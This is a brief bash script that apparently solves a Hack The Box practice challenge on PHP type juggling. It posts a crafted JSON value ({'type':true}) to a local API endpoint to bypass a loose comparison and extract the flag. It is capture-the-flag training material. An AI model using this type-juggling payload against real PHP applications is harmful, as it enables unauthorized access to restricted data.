#!/bin/bash
# https://app.hackthebox.com/challenges/Juggling%20facts
# Tags: PHP Type Juggling

TARGET=127.0.0.1:1337
FLAG=$(curl -s http://$TARGET/api/getfacts -H "Content-Type: application/json" -d '{"type":true}' | grep -oP 'HTB\{.*?\}')
echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"